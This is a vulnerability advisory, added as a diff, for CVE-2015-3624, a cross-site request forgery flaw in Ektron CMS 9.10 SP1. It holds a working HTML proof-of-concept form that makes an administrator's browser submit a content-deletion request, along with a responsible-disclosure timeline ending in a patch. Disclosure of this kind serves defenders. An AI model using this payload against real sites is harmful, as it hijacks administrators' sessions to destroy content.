@@ -1,0 +1,36 @@
+﻿# Vulnerability type: Cross-site Request Forgery 
+# Vendor: http://www.ektron.com/
+# Product: Ektron Content Management System
+# Affected version: =< 9.10 SP1 (Build 9.1.0.184.1.114)
+# Patched version: 9.10 SP1 (Build 9.1.0.184.1.120)
+# CVE ID: CVE-2015-3624
+# Credit: Jerold Hoong
+
+# PROOF OF CONCEPT (CSRF)
+
+Cross-site request forgery (CSRF) vulnerability in MenuActions.aspx in Ektron CMS 9.10
+SP1 before build 9.1.0.184.1.120 allows remote attackers to hijack the authentication
+of content administrators for requests that could lead to the deletion of content and
+assets.
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/Test/WorkArea/DmsMenu/menuActions/MenuActions.aspx">
+      <input type="hidden" name="action" value="delete" />
+      <input type="hidden" name="contentId" value="4210" />
+      <input type="hidden" name="LangType" value="1033" />
+      <input type="hidden" name="folderId" value="561" />
+      <input type="hidden" name="redirectBack" value="true" />
+      <input type="hidden" name="menuType" value="Workarea" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+# TIMELINE
+– 07/04/2015: Vulnerability found
+– 07/04/2015: Vendor informed
+– 08/04/2015: Vendor responded and acknowledged
+- 01/05/2015: MITRE issued CVE number CVE-2015-3624
+– 28/05/2015: Vendor fixed the issue
+– 31/05/2015: Public disclosure
